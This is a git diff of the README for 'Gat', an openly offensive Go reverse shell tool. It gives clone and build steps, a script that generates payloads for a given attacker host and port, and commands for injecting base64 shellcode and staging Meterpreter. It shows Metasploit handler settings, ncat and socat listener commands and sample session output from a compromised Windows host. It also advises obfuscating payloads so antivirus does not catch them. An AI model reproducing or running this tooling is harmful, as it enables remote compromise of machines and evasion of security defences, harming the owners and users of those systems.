@@ -1,8 +1,6 @@
 # Gat
 Golang Access Tool
-
 Simple TCP reverse shell written in [Go](https://golang.org).
-
 It uses TLS to secure the communications, and provide a certificate public key fingerprint pinning feature, preventing from traffic interception.
 
 Supported OS are:
@@ -12,19 +10,12 @@ Supported OS are:
 - Mac OS
 - FreeBSD and derivatives
 
-## Why ?
-
-The goal of this project is to get a simple reverse shell, which can work on multiple systems.
-
-## How ?
-
-Since it's written in Go, you can cross compile the source for the desired architecture.
-
 ## Getting started & dependencies
 
-As this is a Go project, you will need to follow the [official documentation](https://golang.org/doc/install) to set up
-your Golang environment (with the `$GOPATH` environment variable).\
-\
+Since this is a Go project, you will need to follow the [official documentation](https://golang.org/doc/install) to set up
+your Golang environment.\
+(with the `$GOPATH` environment variable).
+
 ```
 git clone https://github.comm1ddl3w4r3/Gat.git
 cd Gat
@@ -32,47 +23,112 @@ go mod init Gat/Gat
 go mod tidy
 go get github.com/Binject/debug/pe
 go build Mangle.go
-
 ```
-### Building the payload
+## Usage
 
-To simplify things, you can use the provided Makefile.
-You can set the following environment variables:
+##Gat.sh to make things easy.
+```
+./Gat.sh - Will show example and ascii art.
+./Gat.sh [ Windows|Mac|Linux ] <LHOST> <LPORT> - Will generate given OS type payload.
+./Gat.sh Cleanup - Will cleanup past deployments.
+```
 
-- ``GOOS`` : the target OS
-- ``GOARCH`` : the target architecture
-- ``LHOST`` : the attacker IP or domain name
-- ``LPORT`` : the listener port
-
-For the ``GOOS`` and ``GOARCH`` variables, you can get the allowed values [here](https://golang.org/doc/install/source#environment).
-
-However, some helper targets are available in the ``Makefile``:
-
-- ``depends`` : generate the server certificate (required for the reverse shell)
-- ``windows32`` : builds a windows 32 bits executable (PE 32 bits)
-- ``windows64`` : builds a windows 64 bits executable (PE 64 bits)
-- ``linux32`` : builds a linux 32 bits executable (ELF 32 bits)
-- ``linux64`` : builds a linux 64 bits executable (ELF 64 bits)
-- ``macos32`` : builds a mac os 32 bits executable (Mach-O)
-- ``macos64`` : builds a mac os 64 bits executable (Mach-O)
-
-For those targets, you just need to set the ``LHOST`` and ``LPORT`` environment variables.
-
-### Using the shell
-
-Once executed, you will be provided with a remote shell.
 This custom interactive shell will allow you to execute system commands through `cmd.exe` on Windows, or `/bin/sh` on UNIX machines.
 
 The following special commands are supported:
 
-* ``run_shell`` : drops you an system shell (allowing you, for example, to change directories)
+* ``shell`` : drops you an system shell (allowing you, for example, to change directories)
 * ``inject <base64 shellcode>`` : injects a shellcode (base64 encoded) in the same process memory, and executes it
 * ``meterpreter [tcp|http|https] IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp, http or https malleable agent from metasploit, and execute the shellcode in memory (Windows only at the moment)
 * ``exit`` : exit gracefully
 
-## Usage
+## Examples
 
-First of all, you will need to generate a valid certificate:
+### Basic usage
+
+One can use various tools to handle incomming connections, by default Gat will use 'MSF's Multi Handler' for default shell catcher.\
+These shells can be upgraded to meterpreter shells using the 'meterpreter' command in Gat.\
+
+Other options are available to catch shells and upgrade to 'meterpreter' such as:\
+
+*socat\
+*ncat
+
+## Meterpreter staging
+**WARNING**: this currently only work for the Windows platform.
+
+The meterpreter staging currently supports the following payloads :
+
+* `windows/x64/meterpreter/reverse_tcp`
+* `windows/x64/meterpreter/reverse_http`
+* `windows/x64/meterpreter/reverse_https`
+
+To use the correct one, just specify the transport you want to use (tcp, http, https)
+To use the meterpreter staging feature, just start your handler:
+
+```bash
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 172.16.122.105
+set lport 8443
+set HandlerSSLCert ./server.pem
+exploit -j
+```
+
+Then, in `Gat`, use the `meterpreter` command:
+
+```bash
+[Gat]> meterpreter https 127.0.0.1:8443
+```
+
+A new meterpreter session should pop in `msfconsole`:
+
+```bash
+[13:37:00][127.0.0.1][Sessions: 0][Jobs: 1] exploit(multi/handler) >
+[*] [2022.02.22-13:37:00] https://127.0.0.1:8443 handling request from 127.0.0.1; (UUID: uxec7w3h) Staging x64 payload (206937 bytes) ...
+[*] meterpreter session 1 opened (127.0.0.1:8443 -> 127.0.0.1:44804) at 2022-02-22 13:37:00 +0100
+
+[13:37:03][127.0.0.1][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                            Connection
+  --  ----  ----                     -----------                            ----------
+  1         meterpreter x64/windows  EVILCORP\sconner @ LWS01  127.0.0.1:8443 -> 127.0.0.1:44804 (127.0.0.1)
+
+[13:37:05][127.0.0.1][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: LWS01\sconner
+```
+Here is an example with `ncat`:
+
+```bash
+$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
+Ncat: Version 7.60 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 127.0.0.1.
+Ncat: Connection from 127.0.0.1:47814.
+[Gat]> whoami
+LWS01/sconner
+```
+
+'socat' example (tested with version `1.7.3.2`):
+```bash
+$ socat `tty` OPENSSL-LISTEN:1234,reuseaddr,cert=server.pem,key=server.key,verify=0
+# connection would be initiated here
+[Gat]> whoami
+LWS01\sconner
+```
+
+## Manually create GAT for more custom setup.
+***WARNING*** Generating this way will not apply mangle to the payload and could be caught by AV. \
+(Make sure to obfuscate it if you do this.)
+
+You will need to generate a valid certificate:
 ```bash
 $ make depends
 openssl req -subj '/CN=yourcn.com/O=YourOrg/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
@@ -108,122 +164,6 @@ $ make macos32 LHOST=192.168.0.12 LPORT=1234
 # Predifined 64 bit target
 $ make macos64 LHOST=192.168.0.12 LPORT=1234
 ```
-
-## Examples
-
-### Basic usage
-
-One can use various tools to handle incomming connections, such as:
-
-* socat
-* ncat
-* openssl server module
-* metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)
-
-Here is an example with `ncat`:
-
-```bash
-$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
-Ncat: Version 7.60 ( https://nmap.org/ncat )
-Ncat: Listening on :::1234
-Ncat: Listening on 0.0.0.0:1234
-Ncat: Connection from 172.16.122.105.
-Ncat: Connection from 172.16.122.105:47814.
-[Gat]> whoami
-LWS01/sconner
-```
-
-Here is an example with `socat` (tested with version `1.7.3.2`):
-```bash
-$ socat `tty` OPENSSL-LISTEN:1234,reuseaddr,cert=server.pem,key=server.key,verify=0
-# connection would be initiated here
-[Gat]> whoami
-LWS01\sconner
-```
-
-### meterpreter staging
-
-**WARNING**: this currently only work for the Windows platform.
-
-The malleable staging currently supports the following payloads :
-
-* `windows/meterpreter/reverse_tcp`
-* `windows/x64/meterpreter/reverse_tcp`
-* `windows/meterpreter/reverse_http`
-* `windows/x64/meterpreter/reverse_http`
-* `windows/meterpreter/reverse_https`
-* `windows/x64/meterpreter/reverse_https`
-
-To use the correct one, just specify the transport you want to use (tcp, http, https)
-
-To use the meterpreter staging feature, just start your handler:
-
-```bash
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set lhost 172.16.122.105
-set lport 8443
-set HandlerSSLCert ./server.pem
-exploit -j
-```
-
-Then, in `Gat`, use the `meterpreter` command:
-
-```bash
-[Gat]> meterpreter https 172.16.122.105:8443
-```
-
-A new meterpreter session should pop in `msfconsole`:
-
-```bash
-[14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
-[*] [2022.01.29-14:16:44] https://172.16.122.105:8443 handling request from 172.16.122.105; (UUID: pqzl9t5k) Staging x64 payload (206937 bytes) ...
-[*] meterpreter session 1 opened (172.16.122.105:8443 -> 172.16.122.105:44804) at 2018-01-29 14:16:44 +0100
-
-[14:16:46][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions
-
-Active sessions
-===============
-
-  Id  Name  Type                     Information                            Connection
-  --  ----  ----                     -----------                            ----------
-  1         meterpreter x64/windows  EVILCORP\sconner @ LWS01  172.16.122.105:8443 -> 172.16.122.105:44804 (10.0.2.15)
-
-[14:16:48][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions -i 1
-[*] Starting interaction with 1...
-
-meterpreter > getuid
-Server username: LWS01\sconner
-```
-
-### meterpreter staging
-
-**WARNING**: this currently only work for the Windows platform.
-
-The meterpreter staging currently supports the following payloads :
-
-To use the correct one, just specify the transport you want to use (tcp, http, https)
-
-To use the meterpreter staging feature, just start your handler:
-
-```bash
-
-```
-
-Then, in `Gat`, use the `meterpreter` command:
-
-```bash
-[Gat]> meterpreter https 172.16.122.105:8443
-```
-
-A new meterpreter session should pop in `msfconsole`:
-
-```bash
-
-meterpreter > getuid
-Server username: EVILCORP\sconner
-```
-
 
 ## Credits
 Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
